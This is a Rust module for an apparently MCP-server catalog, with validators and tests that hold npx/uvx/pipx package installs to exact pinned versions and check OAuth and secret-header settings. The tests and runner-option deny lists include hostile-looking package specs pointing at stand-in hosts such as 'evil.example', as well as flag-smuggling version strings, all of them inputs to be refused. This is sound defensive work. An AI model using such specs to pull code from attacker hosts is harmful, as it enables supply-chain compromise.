//! The curated catalog of popular MCP servers shipped with the bot
//! (`catalog.json`).  It is data only: installing an entry means turning
//! [`CatalogInstall`] into an [`crate::McpServerConfig`] and storing the
//! user's secrets under the names in `required_secrets`.

use std::collections::BTreeMap;

use serde::{Deserialize, Serialize};

use crate::error::{McpError, Result};

const CATALOG_JSON: &str = include_str!("../catalog.json");

/// One secret an entry needs; the user supplies the value, it is stored under `name`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RequiredSecret {
    /// Secret name (a key of the secret store, e.g. `mcp/github-token`).
    pub name: String,
    /// Human label for the input field.
    pub label: String,
    /// Where the user can get the value.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub help_url: Option<String>,
}

/// A folder the user must choose before the server is added.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RequiredFolder {
    /// Human label for the folder field.
    pub label: String,
}

/// A sign-in client the owner creates themselves with the authorization
/// server (Google: their own Cloud project), because Praxi ships none. The
/// desktop walks the owner through it (`setup` names the guide), stores the
/// client secret in the secret store and writes the server's `oauth` block.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CatalogOAuthClient {
    /// The authorization server the client is registered with (https).
    pub issuer: String,
    /// What the sign-in asks for: the read-only scopes. Changing things is a
    /// second, explicit choice and is never in this list.
    pub scopes: Vec<String>,
    /// Ask for a refresh token too (Google needs `access_type=offline`).
    #[serde(default)]
    pub offline_access: bool,
    /// Which guided setup of the app walks through creating the client.
    pub setup: String,
}

/// One fixed, read-only call the owner's "Test" button makes to prove the
/// connection works: it shows the first few items it returns.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CatalogTest {
    /// Server-side tool name (must be one the catalog marks read-only).
    pub tool: String,
    /// Fixed arguments.
    pub arguments: serde_json::Value,
}

/// How to run a catalog server.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CatalogInstall {
    /// `stdio` or `http`.
    pub transport: String,
    /// Executable (stdio).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    /// Arguments (stdio).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub args: Option<Vec<String>>,
    /// Endpoint (http).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
    /// Non-secret environment variables (stdio).
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub env: BTreeMap<String, String>,
    /// Environment variable -> secret name (stdio).
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub secret_env: BTreeMap<String, String>,
    /// Header -> secret name (http).
    ///
    /// The value may name its secret once — `Bearer {secret:NAME}` — which the
    /// config keeps verbatim and `resolve_secrets` substitutes at connect time.
    /// The same string therefore means the same thing here and in `mcp.toml`;
    /// see `McpServerConfig::secret_headers`.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub secret_headers: BTreeMap<String, String>,
    /// Secrets the user must provide first.
    #[serde(default)]
    pub required_secrets: Vec<RequiredSecret>,
    /// A folder the user must choose; it is appended as the last argument.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub folder: Option<RequiredFolder>,
    /// Sign-in needs a client the owner creates themselves (http).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub oauth_client: Option<CatalogOAuthClient>,
    /// What the "Test" button runs, when the entry has one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub test: Option<CatalogTest>,
    /// Tools the server may expose (glob over the server-side name). A
    /// read-only entry lists only its read tools, so the others stay hidden
    /// until the owner chooses otherwise.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub tool_allow: Vec<String>,
}

/// What it takes to sign in to an entry, as the catalog declares it. The
/// declaration has to agree with the install recipe ([`check_declared_auth`])
/// and, for a remote app, with what the vendor's server advertises (the live
/// mode of `scripts/verify_mcp_catalog.py`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum CatalogAuth {
    /// Nothing: no account and no secret (a local tool, an open public server).
    None,
    /// OAuth in the browser; the server registers Praxi as a client by itself
    /// (dynamic client registration), so the owner only signs in.
    OauthDcr,
    /// OAuth with a client the owner creates with the vendor first
    /// (`install.oauth_client`).
    OauthOwnClient,
    /// A key, token or connection string the owner pastes (`required_secrets`).
    ApiKey,
}

/// A catalog entry.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CatalogEntry {
    /// Stable id (also the suggested server name).
    pub id: String,
    /// Display name.
    pub name: String,
    /// One-line description.
    pub description: String,
    /// Permission category the server's tools get.
    pub category: String,
    /// Project page.
    pub homepage: String,
    /// [simple-icons](https://simpleicons.org) slug, if there is one.
    pub icon: Option<String>,
    /// Licence of the server software Praxi runs: an SPDX expression, or
    /// `hosted` for a server the vendor runs (nothing is installed, the
    /// vendor's own terms apply). Required on every shipped entry.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub license: Option<String>,
    /// What signing in needs. Required on every shipped entry.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub auth: Option<CatalogAuth>,
    /// How to run it.
    pub install: CatalogInstall,
}

/// A catalog `secret_headers` value names its secret in the same form the
/// config stores (`Authorization: Bearer {secret:mcp/github-token}`), so
/// `validate()` and `resolve_secrets` see exactly what the catalog shipped.
/// Exactly one secret per header, and it must be declared, or the catalog is
/// wrong: fail it here rather than let it misbehave at connect time.
///
/// # Errors
/// [`McpError::Config`] naming the entry and the header.
pub fn check_secret_header_templates(entry: &CatalogEntry) -> Result<()> {
    if entry.install.secret_headers.is_empty() {
        return Ok(());
    }
    let declared: Vec<&str> = entry
        .install
        .required_secrets
        .iter()
        .map(|s| s.name.as_str())
        .collect();
    for (header, value) in &entry.install.secret_headers {
        let named = crate::transport::secret_header_names(value).map_err(|why| {
            McpError::Config(format!(
                "server `{}`: `secret_headers.{header}` {why}",
                entry.id
            ))
        })?;
        if named.len() != 1 {
            return Err(McpError::Config(format!(
                "server `{}`: `secret_headers.{header}` names {} secrets; exactly one is allowed",
                entry.id,
                named.len()
            )));
        }
        if !declared.contains(&named[0]) {
            return Err(McpError::Config(format!(
                "server `{}`: `secret_headers.{header}` names `{}`, which is not declared in `required_secrets`",
                entry.id, named[0]
            )));
        }
    }
    Ok(())
}

/// A `oauth_client` entry is an http server whose client the owner creates:
/// an https issuer, at least one scope, no token header to fall back on, and a
/// `test` that only names a tool the entry lets through.
///
/// # Errors
/// [`McpError::Config`] naming the entry.
pub fn check_oauth_client(entry: &CatalogEntry) -> Result<()> {
    let bad = |why: &str| Err(McpError::Config(format!("server `{}`: {why}", entry.id)));
    let Some(client) = &entry.install.oauth_client else {
        return Ok(());
    };
    if entry.install.transport != "http" || !entry.install.required_secrets.is_empty() {
        return bad("`oauth_client` belongs on an http entry without required secrets");
    }
    if !client.issuer.starts_with("https://") {
        return bad("`oauth_client.issuer` must be an https URL");
    }
    if client.scopes.is_empty() || client.setup.is_empty() {
        return bad("`oauth_client` needs `scopes` and `setup`");
    }
    if let Some(test) = &entry.install.test {
        let allowed = entry.install.tool_allow.is_empty()
            || entry.install.tool_allow.iter().any(|t| t == &test.tool);
        if !allowed || !test.arguments.is_object() {
            return bad("`test` must be an object call to a tool in `tool_allow`");
        }
    }
    Ok(())
}

/// A shipped entry notes its licence and declares its sign-in, and the
/// declaration matches the recipe: pasted secrets are `api-key`, an owner-made
/// client is `oauth-own-client`, `oauth-dcr` is a remote app with neither, and
/// `none` needs nothing at all.
///
/// # Errors
/// [`McpError::Config`] naming the entry.
pub fn check_declared_auth(entry: &CatalogEntry) -> Result<()> {
    let bad = |why: &str| Err(McpError::Config(format!("server `{}`: {why}", entry.id)));
    match entry.license.as_deref().map(str::trim) {
        None | Some("") => return bad("`license` is not noted (an SPDX id, or `hosted`)"),
        Some(_) => {}
    }
    let Some(auth) = entry.auth else {
        return bad("`auth` is not declared");
    };
    let install = &entry.install;
    let secrets = !install.required_secrets.is_empty();
    let own_client = install.oauth_client.is_some();
    let remote = install.transport == "http";
    let agrees = match auth {
        CatalogAuth::ApiKey => secrets && !own_client,
        CatalogAuth::OauthOwnClient => own_client && !secrets,
        CatalogAuth::OauthDcr => remote && !secrets && !own_client,
        CatalogAuth::None => !secrets && !own_client,
    };
    if !agrees {
        return bad("`auth` does not match `required_secrets` / `oauth_client` / the transport");
    }
    Ok(())
}

/// The catalog shipped with the bot.
///
/// # Errors
/// [`McpError::Config`] if the embedded JSON is malformed or a stdio entry
/// launches an unpinned package (`npx -y pkg`, `uvx pkg`, `@latest`).
pub fn builtin_catalog() -> Result<Vec<CatalogEntry>> {
    let entries: Vec<CatalogEntry> = serde_json::from_str(CATALOG_JSON)
        .map_err(|e| McpError::Config(format!("embedded MCP catalog is invalid: {e}")))?;
    for entry in &entries {
        if entry.install.transport == "stdio" {
            check_stdio_package_pin(
                &entry.id,
                entry.install.command.as_deref().unwrap_or(""),
                entry.install.args.as_deref().unwrap_or(&[]),
            )?;
        }
        check_secret_header_templates(entry)?;
        check_oauth_client(entry)?;
        check_declared_auth(entry)?;
    }
    Ok(entries)
}

fn command_base(command: &str) -> String {
    let base = command
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(command)
        .to_ascii_lowercase();
    for ext in [".exe", ".cmd", ".bat"] {
        if let Some(stem) = base.strip_suffix(ext) {
            return stem.to_owned();
        }
    }
    base
}

fn mentions_latest(arg: &str) -> bool {
    let lower = arg.to_ascii_lowercase();
    lower == "latest" || lower.ends_with("@latest") || lower.contains("@latest")
}

/// Exact `major.minor.patch` with an optional prerelease (`1.2.3-rc.1`).
fn is_exact_version(version: &str) -> bool {
    let version = version.split('+').next().unwrap_or(version);
    if version.eq_ignore_ascii_case("latest") {
        return false;
    }
    let (core, pre) = version.split_once('-').unwrap_or((version, ""));
    let parts: Vec<&str> = core.split('.').collect();
    parts.len() == 3
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
        && pre.chars().all(|c| c.is_ascii_alphanumeric() || c == '.')
}

/// An exact npm version: strict semver (`1.2.3`, `1.2.3-rc.1`), nothing else.
/// No build metadata, range, tag or `v` prefix, so the version string cannot
/// carry anything but a version into `pkg@<version>`.
pub(crate) fn exact_npm_version(version: &str) -> bool {
    version.len() <= 128 && semver::Version::parse(version).is_ok_and(|v| v.build.is_empty())
}

/// An exact `PyPI` version in the public PEP 440 form `N.N.N` with optional
/// `aN`/`bN`/`rcN`, `.postN` and `.devN` parts. No epoch, local version,
/// wildcard, specifier operator or normalization-dependent spelling.
pub(crate) fn exact_pypi_version(version: &str) -> bool {
    fn number(s: &str) -> bool {
        !s.is_empty() && s.len() <= 9 && s.bytes().all(|b| b.is_ascii_digit())
    }
    if version.len() > 128 {
        return false;
    }
    let rest = match version.rsplit_once(".dev") {
        Some((rest, n)) if number(n) => rest,
        Some(_) => return false,
        None => version,
    };
    let rest = match rest.rsplit_once(".post") {
        Some((rest, n)) if number(n) => rest,
        Some(_) => return false,
        None => rest,
    };
    let release = match rest.find(|c: char| c.is_ascii_alphabetic()) {
        Some(at) => {
            let (release, pre) = rest.split_at(at);
            let n = pre
                .strip_prefix("rc")
                .or_else(|| pre.strip_prefix('a'))
                .or_else(|| pre.strip_prefix('b'));
            if !n.is_some_and(number) {
                return false;
            }
            release
        }
        None => rest,
    };
    let parts: Vec<&str> = release.split('.').collect();
    parts.len() == 3 && parts.iter().all(|p| number(p))
}

/// Whether a stdio command is one of the two package runners registry sources
/// may use.
pub(crate) fn is_allowed_registry_runner(command: &str) -> bool {
    matches!(command, "npx" | "uvx")
}

/// A plain registry package name: no URL, path, git or file spec can pass as a
/// "pinned" package because of an `@1.2.3` hidden in its tail.
pub(crate) fn plain_package_name(name: &str, scoped_ok: bool) -> bool {
    let (scope, rest) = match name.strip_prefix('@') {
        Some(tail) if scoped_ok => match tail.split_once('/') {
            Some((scope, rest)) => (Some(scope), rest),
            None => return false,
        },
        _ => (None, name),
    };
    let part = |p: &str| {
        !p.is_empty()
            && p.chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '~'))
    };
    scope.is_none_or(part) && part(rest)
}

fn npm_pinned(spec: &str) -> bool {
    let (name, version) = if let Some(rest) = spec.strip_prefix('@') {
        let Some((name, version)) = rest.split_once('@') else {
            return false;
        };
        (&spec[..=name.len()], version)
    } else {
        let Some((name, version)) = spec.split_once('@') else {
            return false;
        };
        (name, version)
    };
    plain_package_name(name, true) && is_exact_version(version)
}

fn python_pinned(spec: &str) -> bool {
    let (name, version) = if let Some((name, version)) = spec.split_once("==") {
        (name, version.split('[').next().unwrap_or(version))
    } else if let Some((name, version)) = spec.split_once('@') {
        (name, version)
    } else {
        return false;
    };
    // Extras (`pkg[extra]`) are part of the name, not a location.
    let name = name.split('[').next().unwrap_or(name);
    plain_package_name(name, false) && is_exact_version(version)
}

/// Whether the command is a package runner (`npx`, `uvx`, `pipx run`, ...),
/// which fetches and runs code from a package index.
pub(crate) fn is_package_runner(command: &str, args: &[String]) -> bool {
    !matches!(runner_of(&command_base(command), args), Ok(None))
}

/// How a package runner names what it installs.
#[derive(Clone, Copy)]
enum Runner {
    /// `npx`, `bunx`, `npm exec`, `pnpm dlx`, `yarn dlx`.
    Npm,
    /// `uvx`, `uv tool run`.
    Uv,
    /// `pipx run`.
    Pipx,
}

/// The runner and the arguments it parses, or why the form is refused.
fn runner_of<'a>(
    base: &str,
    args: &'a [String],
) -> std::result::Result<Option<(Runner, &'a [String])>, String> {
    let first = args.first().map(String::as_str);
    Ok(Some(match base {
        "npx" | "bunx" | "dlx" => (Runner::Npm, args),
        "npm" => match first {
            Some("exec" | "x") => (Runner::Npm, &args[1..]),
            _ => return Err("`npm` is only accepted as `npm exec`".into()),
        },
        "pnpm" | "yarn" => match first {
            Some("dlx") => (Runner::Npm, &args[1..]),
            _ => return Err(format!("`{base}` is only accepted as `{base} dlx`")),
        },
        "uvx" => (Runner::Uv, args),
        "uv" => match (first, args.get(1).map(String::as_str)) {
            (Some("tool"), Some("run")) => (Runner::Uv, &args[2..]),
            _ => return Err("`uv` is only accepted as `uv tool run`".into()),
        },
        "pipx" => match first {
            Some("run") => (Runner::Pipx, &args[1..]),
            _ => return Err("`pipx` is only accepted as `pipx run`".into()),
        },
        _ => return Ok(None),
    }))
}

/// Options of each runner: the ones naming packages (each must be pinned),
/// the ones that are refused (they run a shell string, install from another
/// source or an editable tree), and the other ones that take a value.
fn runner_options(
    runner: Runner,
) -> (
    &'static [&'static str],
    &'static [&'static str],
    &'static [&'static str],
) {
    match runner {
        Runner::Npm => (
            &["--package", "-p"],
            &[
                "-c",
                "--call",
                "--registry",
                "--userconfig",
                "--prefix",
                "-C",
            ],
            &["--cache", "--loglevel", "-w", "--workspace"],
        ),
        Runner::Uv => (
            &["--from", "--with"],
            &[
                "--with-editable",
                "--with-requirements",
                "--index",
                "--index-url",
                "--extra-index-url",
                "--default-index",
                "--find-links",
                "-f",
            ],
            &["--python", "-p", "--refresh-package", "--constraints", "-c"],
        ),
        Runner::Pipx => (
            &["--spec"],
            &["--pip-args", "--index-url", "-i", "--editable", "-e"],
            &["--python"],
        ),
    }
}

/// Fail when a stdio server (catalog entry or pasted line) would `npx`/`uvx`
/// an unpinned package.  Every package-bearing option counts (review finding
/// 7: `--package`, `--from`, `--with`, `--spec`), not just the first
/// positional argument; forms the rule cannot reason about are refused.
///
/// # Errors
/// [`McpError::Config`] naming the unpinned spec or the refused form.
pub fn check_stdio_package_pin(id: &str, command: &str, args: &[String]) -> Result<()> {
    runner_packages(id, command, args).map(|_| ())
}

/// The package specs a runner command line would download, each already
/// checked to be pinned. `None` when the command is not a package runner.
///
/// # Errors
/// [`McpError::Config`] naming the unpinned spec or the refused form.
pub(crate) fn runner_packages(
    id: &str,
    command: &str,
    args: &[String],
) -> Result<Option<Vec<String>>> {
    let refuse = |why: String| Err(McpError::Config(format!("server `{id}`: {why}")));
    if args.iter().any(|a| mentions_latest(a)) {
        return refuse("stdio package must be pinned to an exact version, not @latest".into());
    }
    let base = command_base(command);
    let (runner, rest) = match runner_of(&base, args) {
        Ok(Some(found)) => found,
        Ok(None) => return Ok(None),
        Err(why) => return refuse(why),
    };
    let (package_flags, refused_flags, value_flags) = runner_options(runner);
    let mut packages: Vec<&str> = Vec::new();
    let mut positional = None;
    let mut i = 0;
    while i < rest.len() {
        let arg = rest[i].as_str();
        if arg == "--" {
            positional = rest.get(i + 1).map(String::as_str);
            break;
        }
        let (flag, inline) = match arg.split_once('=') {
            Some((flag, value)) if flag.starts_with('-') => (flag, Some(value)),
            _ => (arg, None),
        };
        if refused_flags.contains(&flag) {
            return refuse(format!("the runner option `{flag}` is not accepted"));
        }
        if package_flags.contains(&flag) || value_flags.contains(&flag) {
            let value = if let Some(v) = inline {
                v
            } else {
                i += 1;
                match rest.get(i) {
                    Some(v) => v.as_str(),
                    None => return refuse(format!("`{flag}` needs a value")),
                }
            };
            if package_flags.contains(&flag) {
                // `uv --with a,b` names several packages.
                packages.extend(value.split(',').map(str::trim).filter(|v| !v.is_empty()));
            }
            i += 1;
            continue;
        }
        if arg.starts_with('-') {
            i += 1;
            continue;
        }
        positional = Some(arg);
        break;
    }
    // Without a package option the first positional argument is the package;
    // with one (`--package`, `--from`, `--spec`), it names the command to run.
    let names_package = match runner {
        Runner::Npm => !packages.is_empty(),
        Runner::Uv | Runner::Pipx => rest.iter().any(|a| {
            let flag = a.split_once('=').map_or(a.as_str(), |(f, _)| f);
            flag == "--from" || flag == "--spec"
        }),
    };
    if !names_package {
        match positional {
            Some(spec) => packages.push(spec),
            None => {
                return refuse(format!(
                    "stdio runner `{base}` has no package argument to pin"
                ));
            }
        }
    }
    for spec in &packages {
        let pinned = match runner {
            Runner::Npm => npm_pinned(spec),
            Runner::Uv | Runner::Pipx => python_pinned(spec),
        };
        if !pinned {
            return refuse(format!(
                "stdio package `{spec}` is unpinned; use an exact version (`pkg@1.2.3` or `pkg==1.2.3`), not a floating npx/uvx install"
            ));
        }
    }
    Ok(Some(packages.into_iter().map(str::to_owned).collect()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::McpServerConfig;
    use crate::transport::secret_header_names;
    use std::collections::HashSet;

    #[test]
    fn exact_versions_are_strict() {
        // `1.0.0--registry` is a valid semver pre-release; it stays one argument
        // (`pkg@1.0.0--registry`) that npm reads as a version, never as a flag.
        for good in [
            "1.2.3",
            "0.0.1",
            "1.2.3-rc.1",
            "10.20.30-beta.2",
            "1.0.0--registry",
        ] {
            assert!(exact_npm_version(good), "{good}");
        }
        for bad in [
            "",
            "1",
            "1.2",
            "1evil",
            "1+evil",
            "1.0.0+build",
            "v1.2.3",
            "^1.2.3",
            "~1.2.3",
            "1.2.x",
            "*",
            "latest",
            "1.2.3 ",
            " 1.2.3",
            "01.2.3",
            "1.2.3-",
            "file:../x",
            "1.2.3/../x",
            "https://x.example/p.tgz",
        ] {
            assert!(!exact_npm_version(bad), "{bad:?}");
        }
        for good in [
            "1.2.3",
            "1.2.3a1",
            "1.2.3b2",
            "1.2.3rc1",
            "1.2.3.post1",
            "1.2.3.dev4",
            "1.2.3rc1.post2.dev3",
        ] {
            assert!(exact_pypi_version(good), "{good}");
        }
        for bad in [
            "",
            "1",
            "1.2",
            "1.2.3.4",
            "1evil",
            "1.0.0--registry",
            "1.0.0+local",
            "1!1.2.3",
            "==1.2.3",
            ">=1.2.3",
            "1.2.*",
            "1.2.3 ",
            "1.2.3rc",
            "1.2.3.post",
            "1.2.3.dev",
            "1.2.3-1",
            "1.2.3c1",
            "latest",
            "1.2.3@https://x.example/p.whl",
        ] {
            assert!(!exact_pypi_version(bad), "{bad:?}");
        }
    }

    #[test]
    fn only_npx_and_uvx_are_registry_runners() {
        assert!(is_allowed_registry_runner("npx") && is_allowed_registry_runner("uvx"));
        for other in [
            "bunx",
            "pnpm",
            "uv",
            "pipx",
            "npx.cmd",
            "/usr/bin/npx",
            "NPX",
            "node",
            "sh",
        ] {
            assert!(!is_allowed_registry_runner(other), "{other}");
        }
    }

    #[test]
    fn google_entries_are_read_only_and_bring_your_own_client() {
        let all = builtin_catalog().unwrap();
        for id in ["google-gmail", "google-drive", "google-calendar"] {
            let e = all
                .iter()
                .find(|e| e.id == id)
                .unwrap_or_else(|| panic!("{id}"));
            let client = e.install.oauth_client.as_ref().expect("oauth_client");
            assert_eq!(client.issuer, "https://accounts.google.com");
            assert!(client.offline_access, "{id}: Google needs a refresh token");
            assert!(e.install.url.as_deref().unwrap().starts_with("https://"));
            // Read-only first: no scope that can change anything.
            for scope in &client.scopes {
                assert!(
                    scope.ends_with(".readonly") || scope.ends_with(".freebusy"),
                    "{id}: {scope} is not read-only"
                );
            }
            let test = e.install.test.as_ref().expect("test call");
            assert!(e.install.tool_allow.contains(&test.tool));
            assert_eq!(e.install.required_secrets, Vec::new());
        }
        // The archived stdio Drive server is gone: one Drive card.
        assert!(
            all.iter()
                .filter(|e| e.id.contains("drive"))
                .all(|e| e.install.transport == "http")
        );
    }

    #[test]
    fn a_bad_oauth_client_entry_is_refused() {
        let mut e = builtin_catalog()
            .unwrap()
            .into_iter()
            .find(|e| e.id == "google-gmail")
            .unwrap();
        assert!(check_oauth_client(&e).is_ok());
        let good = e.clone();
        e.install.oauth_client.as_mut().unwrap().issuer = "http://accounts.google.com".into();
        assert!(check_oauth_client(&e).is_err());
        let mut e = good.clone();
        e.install.test.as_mut().unwrap().tool = "send_email".into();
        assert!(
            check_oauth_client(&e).is_err(),
            "a test may only call an allowed tool"
        );
        let mut e = good;
        e.install.oauth_client.as_mut().unwrap().scopes.clear();
        assert!(check_oauth_client(&e).is_err());
    }

    /// Every shipped entry notes its licence and declares its sign-in, and the
    /// declaration agrees with the recipe; a wrong one fails the catalog.
    #[test]
    fn declared_auth_and_license_match_the_recipe() {
        let all = builtin_catalog().unwrap();
        for e in &all {
            check_declared_auth(e).unwrap_or_else(|er| panic!("{er}"));
        }
        let get = |id: &str| all.iter().find(|e| e.id == id).unwrap().clone();
        assert_eq!(get("linear").auth, Some(CatalogAuth::OauthDcr));
        assert_eq!(get("github").auth, Some(CatalogAuth::ApiKey));
        assert_eq!(get("google-gmail").auth, Some(CatalogAuth::OauthOwnClient));
        assert_eq!(get("deepwiki").auth, Some(CatalogAuth::None));
        assert_eq!(get("linear").license.as_deref(), Some("hosted"));

        let mut e = get("linear");
        e.license = None;
        assert!(check_declared_auth(&e).is_err(), "licence not noted");
        let mut e = get("linear");
        e.license = Some("  ".into());
        assert!(check_declared_auth(&e).is_err(), "blank licence");
        let mut e = get("linear");
        e.auth = None;
        assert!(check_declared_auth(&e).is_err(), "auth not declared");
        let mut e = get("linear");
        e.auth = Some(CatalogAuth::ApiKey);
        assert!(check_declared_auth(&e).is_err(), "api-key without a secret");
        let mut e = get("github");
        e.auth = Some(CatalogAuth::OauthDcr);
        assert!(
            check_declared_auth(&e).is_err(),
            "oauth-dcr with a pasted secret"
        );
        let mut e = get("google-gmail");
        e.auth = Some(CatalogAuth::OauthDcr);
        assert!(
            check_declared_auth(&e).is_err(),
            "oauth-dcr with an owner-made client"
        );
        let mut e = get("filesystem");
        e.auth = Some(CatalogAuth::OauthDcr);
        assert!(
            check_declared_auth(&e).is_err(),
            "a local entry has no dynamic registration"
        );
    }

    #[test]
    fn auth_values_use_the_kebab_names_the_verifier_reads() {
        for (value, want) in [
            ("none", CatalogAuth::None),
            ("oauth-dcr", CatalogAuth::OauthDcr),
            ("oauth-own-client", CatalogAuth::OauthOwnClient),
            ("api-key", CatalogAuth::ApiKey),
        ] {
            let parsed: CatalogAuth = serde_json::from_value(serde_json::json!(value)).unwrap();
            assert_eq!(parsed, want);
        }
        assert!(serde_json::from_value::<CatalogAuth>(serde_json::json!("magic")).is_err());
    }

    #[test]
    fn catalog_parses_and_is_consistent() {
        let all = builtin_catalog().unwrap();
        assert!(all.len() >= 20, "{}", all.len());
        let mut ids = HashSet::new();
        for e in &all {
            assert!(ids.insert(e.id.clone()), "duplicate id {}", e.id);
            assert!(e.homepage.starts_with("https://"), "{}", e.id);
            // Same rules as a user-written config.
            let cat: tool_registry::PermissionCategory =
                serde_json::from_value(serde_json::Value::String(e.category.clone()))
                    .unwrap_or_else(|_| panic!("{}: bad category {}", e.id, e.category));
            let mut cfg = match e.install.transport.as_str() {
                "stdio" => McpServerConfig::stdio(
                    &e.id,
                    e.install.command.clone().expect("command"),
                    e.install.args.clone().unwrap_or_default(),
                ),
                "http" => McpServerConfig::http(&e.id, e.install.url.clone().expect("url")),
                other => panic!("{}: transport {other}", e.id),
            };
            cfg.category = Some(cat);
            cfg.secret_env.clone_from(&e.install.secret_env);
            cfg.secret_headers.clone_from(&e.install.secret_headers);
            cfg.validate().unwrap_or_else(|er| panic!("{}: {er}", e.id));
            // Every referenced secret is declared, and vice versa.  A header
            // template (`Bearer {secret:NAME}`) references the named secret.
            let declared: HashSet<_> = e.install.required_secrets.iter().map(|s| &s.name).collect();
            let mut used: HashSet<&String> = e.install.secret_env.values().collect();
            for value in e.install.secret_headers.values() {
                let named =
                    secret_header_names(value).unwrap_or_else(|why| panic!("{}: {why}", e.id));
                if named.is_empty() {
                    used.insert(value);
                } else {
                    used.extend(named.iter().filter_map(|n| {
                        e.install
                            .required_secrets
                            .iter()
                            .map(|s| &s.name)
                            .find(|name| name.as_str() == *n)
                    }));
                }
            }
            assert_eq!(declared, used, "{}", e.id);
        }
        for want in [
            "filesystem",
            "github",
            "context7",
            "home-assistant",
            "playwright",
        ] {
            assert!(ids.contains(want), "{want}");
        }
    }

    /// A header template is only meaningful when it names one declared secret;
    /// anything else fails the catalog instead of the connection.
    #[test]
    fn header_templates_must_name_one_declared_secret() {
        let entry = |headers: &str, secrets: &str| -> CatalogEntry {
            serde_json::from_str(&format!(
                r#"{{"id":"x","name":"X","description":"d","category":"accounts",
                     "homepage":"https://example.com","icon":null,
                     "install":{{"transport":"http","url":"https://example.com/mcp",
                                 "secret_headers":{headers},"required_secrets":{secrets}}}}}"#
            ))
            .expect("test entry parses")
        };
        let one = r#"[{"name":"mcp/tok","label":"Token"}]"#;
        let ok = |headers: &str, secrets: &str| {
            check_secret_header_templates(&entry(headers, secrets)).is_ok()
        };

        assert!(ok(r#"{"Authorization":"Bearer {secret:mcp/tok}"}"#, one));
        // No placeholder: the value would be a secret name, not a header value.
        assert!(!ok(r#"{"Authorization":"mcp/tok"}"#, one));
        // Two secrets in one header.
        assert!(!ok(
            r#"{"Authorization":"{secret:mcp/tok} {secret:mcp/tok}"}"#,
            one
        ));
        // Names something that is not declared.
        assert!(!ok(r#"{"Authorization":"Bearer {secret:mcp/other}"}"#, one));
        // Unterminated placeholder.
        assert!(!ok(r#"{"Authorization":"Bearer {secret:mcp/tok"}"#, one));
    }

    #[test]
    fn builtin_catalog_rejects_unpinned_stdio_packages() {
        // The shipped catalog is pinned; `builtin_catalog` fails closed otherwise.
        let all = builtin_catalog().unwrap();
        assert!(all.iter().any(|e| e.install.transport == "stdio"));
        let unpinned = [
            ("npx", vec!["-y".into(), "@scope/pkg".into()]),
            ("npx", vec!["-y".into(), "pkg@latest".into()]),
            ("npx", vec!["-y".into(), "@playwright/mcp@latest".into()]),
            ("npx", vec!["-y".into(), "pkg@^1.2.3".into()]),
            ("uvx", vec!["mcp-server-fetch".into()]),
            ("uvx", vec!["postgres-mcp@latest".into()]),
        ];
        for (cmd, args) in unpinned {
            let err = check_stdio_package_pin("demo", cmd, &args).unwrap_err();
            assert!(
                err.to_string().contains("unpinned") || err.to_string().contains("@latest"),
                "{cmd} {args:?}: {err}"
            );
        }
        assert!(
            check_stdio_package_pin("demo", "npx", &["-y".into(), "@scope/pkg@1.2.3".into()])
                .is_ok()
        );
        assert!(
            check_stdio_package_pin("demo", "uvx", &["mcp-server-fetch==2026.11.4".into()]).is_ok()
        );
    }

    /// Review finding 7: every package-bearing runner option is held to the
    /// exact-version rule, and forms the rule cannot reason about are refused.
    #[test]
    fn a_location_cannot_pass_as_a_pinned_package() {
        for ok in ["pkg@1.2.3", "@scope/pkg@1.2.3", "a.b-c_d@1.0.0-rc.1"] {
            assert!(npm_pinned(ok), "{ok}");
        }
        for bad in [
            "https://evil.example/x.tgz?@1.2.3",
            "file:../x@1.2.3",
            "git+https://evil/r@1.2.3",
            "@scope@1.2.3",
            "@/pkg@1.2.3",
            "pkg@latest",
        ] {
            assert!(!npm_pinned(bad), "{bad}");
        }
        for ok in ["pkg==1.2.3", "pkg[extra]==1.2.3", "pkg@1.2.3"] {
            assert!(python_pinned(ok), "{ok}");
        }
        for bad in [
            "git+https://evil/r@1.2.3",
            "https://evil/x.whl#==1.2.3",
            "==1.2.3",
            "pkg",
            "../x==1.2.3",
        ] {
            assert!(!python_pinned(bad), "{bad}");
        }
    }

    #[test]
    fn every_package_bearing_runner_option_is_pinned() {
        let check = |cmd: &str, args: &[&str]| {
            let args: Vec<String> = args.iter().map(|a| (*a).to_owned()).collect();
            check_stdio_package_pin("demo", cmd, &args)
        };
        for (cmd, args) in [
            (
                "npx",
                vec!["--package=unpinned-package", "pinned-command@1.2.3"],
            ),
            (
                "npx",
                vec!["-p", "unpinned-package", "pinned-command@1.2.3"],
            ),
            ("npx", vec!["--package", "a@1.2.3", "--package", "b", "cmd"]),
            (
                "uvx",
                vec!["--with", "unpinned-dependency", "pinned-tool==1.2.3"],
            ),
            (
                "uvx",
                vec!["--with=ok==1.0.0,unpinned", "pinned-tool==1.2.3"],
            ),
            ("uvx", vec!["--from", "unpinned-src", "tool"]),
            ("uv", vec!["tool", "run", "--with", "x", "tool==1.0.0"]),
